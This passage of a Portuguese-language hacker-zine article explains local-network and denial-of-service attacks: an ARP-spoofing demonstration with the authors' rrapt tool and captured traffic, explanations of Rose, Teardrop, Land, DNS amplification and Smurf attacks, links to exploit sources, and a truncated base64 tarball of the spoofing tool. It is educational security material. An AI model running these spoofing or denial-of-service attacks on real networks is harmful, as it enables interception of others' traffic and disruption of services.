+Primeiro, veja a tabela ARP do alvo antes de comecar o ataque:
+
+--------------------------------------------------------
+F:\Documents and Settings\Administrador>arp -a
+
+Interface: 192.168.0.108 --- 0x10003
+  Endereco IP           Endereco fisico       Tipo
+  192.168.0.1            00-15-e9-db-e5-6f     dinamico
+--------------------------------------------------------
+
+O endereco 00-15-e9-db-e5-6f esta correto, este realmente e'
+o MAC address do nosso D-link router DI-604. Agora vamos rodar o rrapt
+contra os alvos 192.168.0.1 e 192.168.0.108 que e' o Windows XP da rede:
+
+--------------------------------------------------------------------------
+root@void:~/RRAPT_2.0/2.0/Reloaded# ./rrapt 00:15:E9:DB:E5:6F 192.168.0.1
+00:11:09:6A:3A:16 192.168.0.108
+Running, ctrl+c to abort...
+--------------------------------------------------------------------------
+
+Veja como ficou a tabela arp do XP:
+
+-------------------------------------------------------
+F:\Documents and Settings\Administrador>arp -a
+
+Interface: 192.168.0.108 --- 0x10003
+  Endereco IP           Endereco fisico       Tipo
+  192.168.0.1           00-0c-29-38-c5-87     dinamico            [!]
+
+F:\Documents and Settings\Administrador>
+-------------------------------------------------------
+
+Perceba em [!] que o MAC 00-0c-29-38-c5-87 e' o endereco do atacante como
+mostra o ifconfig:
+
+---------------------------------------------------------------------------
+root@void:~/RRAPT_2.0/2.0/Reloaded# ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 00:0C:29:38:C5:87
+          inet addr:192.168.0.152  Bcast:192.168.0.255  Mask:255.255.255.0
+---------------------------------------------------------------------------
+
+                Tabela IPs/MACs  (fig 3.1.0)
+      -------------------------------------------------
+      |  Sistema  |     IP        |        MAC        |
+      |-----------|---------------|--------------------
+      |  Windows  | 192.168.0.126 | 00:14:38:0D:2C:45 |
+      |  D-Link   | 192.168.0.1   | 00:15:E9:DB:E5:6F |
+      | Slackware | 192.168.0.152 | 00:0C:29:38:C5:87 |
+      -------------------------------------------------
+
+
+Acessando o Google a partir do Windows XP, podemos ver:
+
+--------------------------------------------------------------------------
+F:\Documents and Settings\Administrador>ping www.google.com
+
+Disparando contra www.l.google.com [216.239.37.99 ] com 32 bytes de dados:
+
+Resposta de 216.239.37.99: bytes=32 tempo=152ms TTL=245
+Resposta de 216.239.37.99: bytes=32 tempo=154ms TTL=245
+Resposta de 216.239.37.99: bytes=32 tempo=153ms TTL=245
+Resposta de 216.239.37.99: bytes=32 tempo=153ms TTL=245
+
+Estatisticas do Ping para 216.239.37.99:
+    Pacotes: Enviados = 4, Recebidos = 4, Perdidos = 0 (0% de perda),
+Aproximar um numero redondo de vezes em milissegundos:
+    Minimo = 152ms, Maximo = 154ms, Media = 153ms
+
+F:\Documents and Settings\Administrador>
+--------------------------------------------------------------------------
+
+Apos o ARP spoofing e' possivel capturarmos todo o trafego que o computador
+Windows envia e recebe, pois agora a maquina Slackware e' o gateway:
+
+--------------------------------------------------------------------------
+root@void:~/RRAPT_2.0# tcpdump -enqti eth0
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
+00:0c:29:38:c5:87 > 00:15:e9:db:e5:6f, ARP, length 42: arp who-has 192.168.0.1
+(00:15:e9:db:e5:6f) tell 192.168.0.108
+00:0c:29:38:c5:87 > 00:11:09:6a:3a:16, ARP, length 42: arp who-has
+192.168.0.108 (00:11:09:6a:3a:16) tell 192.168.0.1
+00:15:e9:db:e5:6f > 00:0c:29:38:c5:87, ARP, length 60: arp reply 192.168.0.1
+is-at 00:15:e9:db:e5:6f
+00:11:09:6a:3a:16 > 00:0c:29:38:c5:87, ARP, length 60: arp reply 192.168.0.108
+is-at 00:11:09:6a:3a:16
+
+
+(...)
+
+[ pingando google.com ]
+
+00:11:09:6a:3a:16 > 00:0c:29:38:c5:87, IPv4, length 74: 192.168.0.108 >
+216.239.37.99: ICMP echo request, id 512, seq 25856, length 40
+00:0c:29:38:c5:87 > 00:15:e9:db:e5:6f, IPv4, length 74: 192.168.0.108 >
+216.239.37.99: ICMP echo request, id 512, seq 25856, length 40
+00:15:e9:db:e5:6f > 00:0c:29:38:c5:87, IPv4, length 74: 216.239.37.99 >
+192.168.0.108: ICMP echo reply, id 512, seq 25856, length 40
+00:0c:29:38:c5:87 > 00:11:09:6a:3a:16, IPv4, length 74: 216.239.37.99 >
+192.168.0.108: ICMP echo reply, id 512, seq 25856, length 40
+00:11:09:6a:3a:16 > 00:0c:29:38:c5:87, IPv4, length 74: 192.168.0.108 >
+216.239.37.99: ICMP echo request, id 512, seq 26112, length 40
+00:0c:29:38:c5:87 > 00:15:e9:db:e5:6f, IPv4, length 74: 192.168.0.108 >
+216.239.37.99: ICMP echo request, id 512, seq 26112, length 40
+00:15:e9:db:e5:6f > 00:0c:29:38:c5:87, IPv4, length 74: 216.239.37.99 >
+192.168.0.108: ICMP echo reply, id 512, seq 26112, length 40
+00:0c:29:38:c5:87 > 00:11:09:6a:3a:16, IPv4, length 74: 216.239.37.99 >
+192.168.0.108: ICMP echo reply, id 512, seq 26112, length 40
+
+(...)
+
+[ acessando a web ]
+
+00:0c:29:38:c5:87 > 00:15:e9:db:e5:6f, IPv4, length 1121: 192.168.0.108.1151 >
+216.239.37.104.80: tcp 1067
+00:15:e9:db:e5:6f > 00:0c:29:38:c5:87, IPv4, length 218: 216.239.37.99.80 >
+192.168.0.108.1150: tcp 164
+00:0c:29:38:c5:87 > 00:11:09:6a:3a:16, IPv4, length 218: 216.239.37.99.80 >
+192.168.0.108.1150: tcp 164
+00:15:e9:db:e5:6f > 00:0c:29:38:c5:87, IPv4, length 218: 216.239.37.99.80 >
+192.168.0.108.1152: tcp 164
+00:0c:29:38:c5:87 > 00:11:09:6a:3a:16, IPv4, length 218: 216.239.37.99.80 >
+192.168.0.108.1152: tcp 164
+00:11:09:6a:3a:16 > 00:0c:29:38:c5:87, IPv4, length 1340: 192.168.0.108.1150 >
+216.239.37.99.80: tcp 1286
+00:0c:29:38:c5:87 > 00:15:e9:db:e5:6f, IPv4, length 1340: 192.168.0.108.1150 >
+216.239.37.99.80: tcp 1286
+--------------------------------------------------------------------------
+
+E' muito facil roubar os seus dados em uma rede local. Tenha isso em mente :)
+
+
+[ --- 3.2. Rose attack, Teardrop e Land
+
+(*) Rose attack
+
+   O Rose fragmentation attack foi descoberto em 2005, aparentemente sem pre-
+tencao, a partir de testes feitos por um engenheiro chamado Ken Hollis.
+Foram feitos testes com os sistemas Windows XP e 2000, alem do Mandrake 10 e
+9.2, todos eles usando firewall. O resultado do ataque e' um alto consumo de
+recursos e o posterior travamento/reboot do sistema.
+
+Os codigos para o Rose podem ser encontrados no site da referencia 15.
+
+(+) Anatomia do ataque
+
+    Como qualquer ataque de fragmentacao, o Rose envia pacotes minusculos no
+offset 0 (primeiro byte do pacote, bit MF ligado), e envia alguns pacotes nos
+nos ultimos offsets do pacote (geralmente no ultimo, o offset 64 e com o bit MF
+desligado).
+Desta maneira a pilha TCP/IP do sistema operacional cria um buffer de 64k que
+nunca sera' completado, pois as informacoes intermediarias nunca chegarao.
+Enquanto o computador espera pelo restante dos pacotes, outros pacotes Rose
+chegam e lotam a fila de fragmentos de pacotes. Assim os proximos pacotes,
+mesmo aqueles legitimos, comecarao a ser descartados.
+
+    Rose attack - estado do buffer alocado da pilha TCP/IP (fig 3.2.0)
+   |--------------------------------------------------------------------|
+   |                                                                    |
+   |  0                              32                             64  |
+   |  ----------------------------------------------------------------  |
+   |  |X|             ...        ...          ...                  |X|  |
+   |  ----------------------------------------------------------------  |
+   |                                                                    |
+   |--------------------------------------------------------------------|
+
+Existe uma outra variacao do ataque chamada de New Dawn que nao sera' abordada
+neste artigo. Consulte a referencia 15 para maiores informacoes.
+
+
+(*) Teardrop
+
+   O famoso Teardrop foi criado no final de 1997 por Mike "route" Schiffman,
+editor-chefe da Phrack `a epoca e autor de diversas ferramentas de rede como o
+nemesis, libnet, etc.
+Para aqueles que ja' frequentavam IRC nesse tempo se lembra que o teardrop.c
+era um dos programas mais usados para as IRC war e para causar DoS ate' mesmo
+em provedores e sistemas maiores.
+
+(+) Anatomia do ataque
+
+   Havia um 'signedness bug' que desencadeava um buffer overflow na funcao
+"ip_glue()" da pilha TCP/IP do kernel do Linux. Esta funcao era responsavel por
+juntar todos os fragmentos do datagrama original e copia-los para um buffer
+maior. Embora a funcao faca uma checagem se o tamanho do fragmento e' muito
+grande, evitando uma potencial corrupcao de memoria, a "ip_glue()" esquece de
+verificar se o fragmento e' pequeno demais. E' possivel forcar um tamanho nega-
+tivo de datagrama e causar a funcao "memcpy()" a copiar muito mais dados do que
+o buffer suporta.
+
+Para maiores informacoes acesse a referencia numero 6. O link se encontra no
+final deste artigo.
+
+
+(*) Land
+
+   O ataque Land foi criado em 1997 por um hacker de 13 anos chamado m3ltman.
+Na epoca de sua criacao o Land foi devastador devido a enorme quantidade de
+sistemas operacionais vulneraveis. O ataque afetava do Windows 95 ao UNIX mais
+exotico, passando por roteadores e outros sistemas menos usuais.
+Na epoca do lancamento algumas pessoas mal-intencionadas chegaram a se utilizar
+do Land para derrubar o Kennedy Space Center da NASA, entre outros grandes
+sistemas.
+Como era de se esperar, o codigo land.c[@] e suas variantes, como o latierra.c,
+foram largamente usados durante os anos de 1998 e 1999.
+
+(+) Anatomia do ataque
+
+   O ataque Land e' bastante simples. Basicamente ele consiste em enviar um
+pacote forjado para a vitima com a flag SYN ativada e IP de origem e destino
+sendo o mesmo e porta de origem e destino sendo a mesma.
+Desta forma a maquina ira' responder a si mesma continuamente ate' todos os
+seus recursos se esgotarem e o sistema travar completamente ou reiniciar.
+
+              Land attack     (fig 3.2.1)
+     --------------------------------------------------------------
+     |                                                            |
+     |   -----------------   dst: 69.69.69.69:139                 | 
+     |   |  Vitima (139) |   src: 69.69.69.69:139   ------------  |
+     |   |  69.69.69.69  |  <---------------------  | Atacante |  |
+     |   -----------------                          ------------  |
+     |                                                            |
+     --------------------------------------------------------------
+
+Impressionantemente, 8 anos depois do lancamento do Land um engenheiro servio
+chamado Dejan Levaja enviou um pacote land para um computador Windows XP SP2 e
+outro Windows 2003 Server. O resultado? Pra espanto geral, lentidao e trava-
+mento do sistema, como em 1997!
+
+[@] land.c: http://packetstormsecurity.org/Exploit_Code_Archive/land.c
+
+
+[ --- 3.3. DNS Amplification Attacks
+
+   Ataques amplificados nao sao nenhuma novidade no mundo da seguranca, e muito
+menos no underground. No final de 2000 o famoso hacker alemao de nick scut, do
+lendario grupo TESO, foi o primeiro a levantar publicamente um pequeno debate
+sobre esse ataque. Tal problema passou despercebido ate' 2006, quando Gadi
+Evron e Randal Vaughn lancaram um paper detalhando o problema.
+Como sempre, Gadi Evron fez o maior estardalhaco, lancou o ataque como novidade
+e ganhou os creditos. Infelizmente a midia desinformada e a Verisign emitiram
+diversos alertas sobre um possivel ataque novo "que poderia comprometer os
+alicerces da internet" mas se esqueceram (ou nao sabiam) que o ataque ja' havia
+sido teorizado anos atras.
+
+Este ataque e' baseado no envio de pacotes UDP spoofados com o intuito de abu-
+sar de DNSes abertos a recursividade, ou seja, DNSes que podem agir como "open
+resolvers" e aceitar requisicoes de resolucao de nomes a partir de qualquer ma-
+quina. O ataque tambem abusa da opcao EDNS dos novos servidores de nomes, que
+e' util para o atacante pois as novas definicoes terminam gerando trafego de
+resposta maior do que os dos nameservers antigos.
+
+O cenario envolvendo ataques de amplificacao de DNS comeca com o atacante tendo
+um nameserver, de preferencia uma maquina comprometida onde ele tenha acesso,
+que possua uma grande quantidade de informacoes na sua resposta (por exemplo os
+records TXT, que podem ter 4kb, MX, entre outros).
+
+
+ Diagrama de ataque de amplificacao de DNS  (fig. 3.3.0) [adaptado da ref. 12]
+------------------------------------------------------------------------------|
+|                                                                             |
+|               (1)                  ----------------           (3)           |
+|     -----------------------------> | Nameserver 1 | --  =============       |
+|     |                              ----------------  |            |||       |
+| ------------                       ----------------  |            |||       |
+| | Atacante | --------------------> | Nameserver 2 | == ====       |||       |
+| ------------                       ----------------  |   ||        v        |
+|        |    ------- ... ---->    ...     /           |   ||     ----------  |
+|        |    ------- ... ---->    ...   /             |   =====> | Vitima |  |
+|        |    ------- ... ---->    ... /               |          ----------  |
+|        |                        ----------------     |              ^       |
+|        -------------- ... ----> | Nameserver N | === | ============|||      |
+|                                 ----------------     |                      |
+|                               /   /                  |                      |
+| ---------------------    <-----   /                  |                      |
+| | NS (comprometido) |    <------/                    |                      |
+| ---------------------   <----------------------------|                      |
+|                                    (2)                                      |
+------------------------------------------------------------------------------|
+
+NOTA: As linhas simples sao a requisicao maliciosa e as linhas cheias indicam
+      o trafego de resposta dos nameservers.
+
+
+(1): O atacante envia requisicoes especificas para os nameservers, com o IP de
+     origem como sendo o IP da vitima, pedindo para resolver o NS comprometido.
+
+(2): Os inumeros nameservers nao sao autoriativos para o dominio requerido e
+     atendem ao pedido. As informacoes sobre o NS comprometido sao cacheadas,
+     de forma que se houver outra requisicao em um determinado periodo de tempo
+     os nameservers resolvers nao precisarao entrar em contato com o NS compro-
+     metido novamente.
+
+(3): Os nameservers enviam para a vitima a resposta, que e' bem maior que a re-
+     quisicao. Muitos nameservers enviando varias respostas "grandes" irao
+     saturar o link da vitima.
+
+Resumindo: Pequenas requisicoes podem ser amplificadas por fatores relativamen-
+te altos e consumir todo o trafego da rede atacada.
+
+E' recomendavel o uso das referencias para se aprofundar pois ha' muito mais
+informacoes sobre este ataque.
+
+
+[ --- 3.4. Smurf attacks
+
+   O ataque Smurf, criado em meados de 1998 por um hacker chamado TFreak, e' um
+DoS da classe de ataques amplificados.
+O problema do Smurf e' bastante simples e bem facil de ser entendido.
+
+O Smurf se aproveita da fraqueza de algumas redes de permitirem que seus IPs de
+broadcasts respondam a pacotes ICMP.
+E' possivel que um atacante envie um pacote forjado de ping, por exemplo, para
+o broadcast de uma rede com o IP de origem como sendo o da vitima. Todos os
+computadores da rede que receberam o pacote irao enviar a resposta para o host
+a ser atacado, significando que um unico pacote enviado pelo atacante tera'
+inumeras respostas (ataque amplificado.)
+
+                           (fig. 3.4.0)
+                                                       ----------
+                                          |----------- | Host A |
+                                          |            ----------
+ ----------   <---------------------------|    ---------- 
+ | Vitima |   <------------------------------- | Host B |          
+ ---------- <-|    <-------------------------| ----------      
+              |----------------------------- |--
+                                           |   |                 ----------
+                              Broadcast    |   |---------------  | Host D |
+                                 ^         |    ----------       ----------
+             ------------        |         ---  | Host C |
+             | Atacante |  -------              ----------
+             ------------
+
+Perceba que quatro e' o fator multiplicativo, uma vez que um "ECHO REQUEST"
+gerou quatro pacotes de "ECHO REPLY". Em uma rede muito grande de computadores
+e' possivel amplificar o ataque em centenas ou milhares de vezes.
+
+Existem diversos codigos para a realizacao deste ataque. O mais famoso e', sem
+duvida, o smurf.c[@], que deu o nome ao ataque.
+
+[@] smurf.c: http://packetstormsecurity.org/Exploit_Code_Archive/smurf.c
+
+
+[ --- 4. Fim
+
+   Se voce chegou ate' aqui, parabens! ;)
+Tenha em mente que este artigo e' basico e e' recomendado ir ate' a secao de
+referencias para se aprofundar nos temas aqui discutidos.
+Esperamos que voce tenha achado util a leitura desse paper. Ficaremos bastante
+felizes com o seu feedback.
+
+
+[ --- 4.1. Agradecimentos
+
+   hash gostaria de agradecer a Julio C. Fort pela determinacao que fez ser
+possivel lancar mais essa edicao da The Bug! Magazine apesar de todos os
+contratempos, ao pessoal do rfdslabs e Gotfault pelo suporte intelectual e pela
+amizade. De resto nao cito mais nomes para nao correr o risco de esquecer de
+alguem.
+
+   sandimas gostaria de agradecer a hash, todos do rfdslabs, gotfault.net,
+brunna (:@@), barrossecurity.com, BSDaemon, Filipe Balestra e risesecurity.org,
+Lucien Rocha e todos os amigos mundo afora.
+Tambem vale a pena citar o cd "Fading American Dream", do Street Dogs, e varios
+outros como a trilha sonora durante a escrita deste artigo.
+
+
+[ --- 4.2 Referencias
+
+(*) Raw Ethernet
+
+1. ARP - Q&A 
+   (http://www.geocities.com/SiliconValley/Vista/8672/network/arp.html)
+
+2. RFC 826 - An Ethernet Address Resolution Protocol (David C. Plummer) 
+   (http://www.faqs.org/rfcs/rfc826.html)
+
+3. Address Resolution Protocol 
+   (http://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html)
+
+4. ARP and RARP Address Translation
+   (http://www.comptechdoc.org/independent/networking/guide/netarp.html)
+
+5. ARP, Address Resolution Protocol
+   (http://www.networksorcery.com/enp/protocol/arp.htm#Opcode)
+
+
+(*) Raw IPv4 e et cetera
+
+1. Unix Network Programming, Vol. 1, 3rd edition (mestre W. Richard Stevens,
+   Bill Fener e Andrew Rudoff)
+   [Editora Addison-Wesley | ISBN 0131411551]
+
+2. TCP/IP Illustrated, Volume 1 - The Protocols (mestre W. Richard Stevens)
+   [Editora Addison-Wesley | ISBN 0201633469]
+
+3. Guia Ilustrado do TCP/IP (Matthew Naugle)
+   [Editora Berkeley | ISBN 0471196568]
+
+4. Beej's Guide To Network Programming (Brian "beej" Hall)
+   (http://www.beej.us/guide/bgnet/)
+
+5. Networking Part 1 e Networking Part 2 (Jesko "Rattle Snake" Huettenhain)
+   (http://neworder.box.sk/files/ip.txt e http://neworder.box.sk/files/tcp.txt)
+
+6. Documentation about native raw socket programming (nitr0gen @ Exile2k)
+   (http://packetstormsecurity.org/programming-tutorials/raw_socket.txt)
+     -- O site original http://www.exile2k.org se encontrava offline --
+
+7. Raw Socket Programming (Komrade) [em italiano]
+   (http://unsecure.altervista.org/rawsocket/rawsocket.htm)
+
+8. A weakness in 4.2 BSD Unix TCP/IP software (Robert T. Morris Jr.)
+   (http://pdos.csail.mit.edu/~rtm/papers/117.pdf)
+
+9. RFC 1858: Security Considerations for IP Fragment Filtering
+   (ftp://ftp.rfc-editor.org/in-notes/rfc1858.txt)
+
+10. DNS Amplification Attacks (Gadi Evron e Randal Vaughn)
+    (http://www.isotf.org/news/DNS-Amplification-Attacks.pdf)
+
+11. TESO - Nameserver traffic amplify and NS route discovery (scut)
+   (http://archive.cert.uni-stuttgart.de/archive/bugtraq/2000/02/msg00198.html)
+
+12. Anatomy of Recent DNS Reflector Attacks (Silva, Scalzo e Barber)
+    (http://www.verisign.com/static/037903.pdf)
+
+13. ICMP attacks against TCP (Fernando Gont)
+    (http://www.gont.com.ar/drafts/icmp-attacks/index.html)
+
+14. Project Neptune (Mike "route" Schiffman)
+    (http://www.phrack.org/phrack/48/P48-13)
+
+15. The Rose Fragmentation Attack (Ken "Gandalf" Hollis)
+    (http://digital.net/~gandalf/Rose_Frag_Attack_Explained.htm)
+
+16. Linux IP fragment overlap bug (Mike "route" Schiffman)
+    (http://seclists.org/bugtraq/1997/Nov/0126.html)
+
+17. The LAND attack IP DoS (m3lt)
+    (http://www.insecure.org/sploits/land.ip.DOS.html)
+
+18. DoS & DDoS Attacks
+    (http://www.dos-attacks.com)
+
+19. Denial-of-service (aborda tambem DDoS)
+    (http://en.wikipedia.org/wiki/Denial_of_service_attack)
+
+20. The Distributed Reflection DoS Attack (Steve Gibson)
+    (http://www.grc.com/dos/drdos.htm)
+
+NOTA: Esse e' um dos poucos trabalhos serios lancados por Steve Gibson. Boa
+      parte do que ele fala e' alarmista e infundado, devendo ser ignorado.
+      Maiores detalhes em http://attrition.org/errata/charlatan.html#gibson
+
+
+[ --- 5. Tarball do rrapt
+
+   Segue abaixo o tarball do rrapt em formato base64. Use o 'uudecode' para
+extrair o arquivo.
+
+
+--- corte aqui ---
+
+begin-base64 644 rrapt_v2.0.tar.gz
+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
